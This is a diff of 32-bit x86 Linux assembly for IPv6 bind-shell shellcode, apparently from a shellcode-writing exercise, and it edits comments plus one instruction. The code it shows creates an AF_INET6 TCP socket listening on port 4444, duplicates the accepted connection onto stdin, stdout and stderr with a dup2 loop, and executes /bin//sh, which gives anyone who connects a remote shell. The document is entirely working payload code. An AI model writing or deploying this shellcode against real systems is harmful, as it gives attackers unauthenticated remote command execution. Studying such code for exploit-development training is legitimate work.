@@ -16,13 +16,13 @@ pop eax			;EAX=0x2
 
 xor ebx,ebx     ; zero out ebx
 
-push  0x6       ; protocol IPv6
+push  0x6       ; IPPROTO_TCP=6
 push  0x1       ; socket_type=SOCK_STREAM (0x1)
 push  0xa       ; AF_INET6 
-inc ebx         ; 1 = SYS_socket
+inc ebx         ; Define SYS_socket = 1
 mov ecx,esp     ; save pointer (ESP) to socket() args (ECX)
 int 0x80
-mov esi,eax     ; saves socket descriptor
+xchg esi,eax    ; socfd stored in esi
 xor eax,eax     
  
 ;int socketcall(int call, unsigned long *args);
@@ -31,8 +31,8 @@ push DWORD eax   ;x4 dword ipv6 loopback | EAX contains 0
 push DWORD eax
 push DWORD eax
 push DWORD eax
-push eax         ;host_addr.sin6_addr = in6addr_any | in6addr_any=::0
-push WORD 0x5c11 ;port 4444
+push eax         ;sin6_addr = in6addr_any | in6addr_any=::0
+push WORD 0x5c11 ;sin6_port=4444 | 0x5c11 | Configurable |
 push WORD 0x0a   ;AF_INET6
 mov ecx,esp		 ;ECX holds pointer to struct sockaddr
 push byte 0x1c 	 ;sizeof(sockaddr)
@@ -74,15 +74,15 @@ xchg ebx,eax 	 ;save clientfd
 push byte 0x2	 ;push 0x2 on stack
 pop ecx			 ;ECX = 2
  
-; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
+;dup2() to redirect stdin(0), stdout(1) and stderr(2)
 loop:
     push byte 0x3f ;dup2()
     pop eax		 ;ECX = 0x3f
     int 0x80     ;exec sys_dup2
-    dec ecx      ;decrement loop-counter
+    dec ecx      ;decrement counter
     jns loop     ;SF not set? then keep on jumping
  
-;;execve(/bin//sh)
+;execve(/bin//sh)
 xor ecx,ecx         ;clear ECX
 push ecx            ;Push NULL
 push byte 0x0b      ;execve() sys call number
